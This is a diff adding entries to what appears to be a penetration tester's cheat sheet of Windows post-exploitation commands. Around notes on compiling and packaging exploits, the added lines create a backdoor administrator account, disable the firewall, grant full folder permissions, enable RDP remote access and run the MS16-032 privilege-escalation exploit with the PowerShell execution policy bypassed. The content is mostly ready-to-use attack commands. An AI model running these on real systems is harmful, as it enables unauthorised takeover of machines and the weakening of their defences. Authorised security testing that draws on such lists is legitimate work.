@@ -8,4 +8,37 @@ i686-w64-mingw32-g++ exploit.cpp -o exploit.exe
 wine ~/.wine/drive_c/Python27/Scripts/pyinstaller.exe --onefile 18176.py
 
 -------------------------------------------------------------------------------
+# show file contents:
+type file
 
+# delete file
+del /f file
+
+# add a new user
+net user <username> <password> /add
+
+# add a user to admin group
+net localgroup administrators <username> /add
+
+# Change password of a user
+net user <username> <password>
+
+# List users
+net user
+
+# info about a user
+net user <username>
+
+# disable firewall
+netsh firewall set opmode disable
+
+# Permissions on a folder recursively
+cacls *.* /t /e /g domainname\administrator:f
+
+# enable RDP access
+reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0
+netsh firewall set service remoteadmin enable
+netsh firewall set service remotedesktop enable
+
+# run an exploit
+powershell -ExecutionPolicy ByPass -command "& { . C:\tmp\Invoke-MS16-032.ps1; Invoke-MS16-032 }"
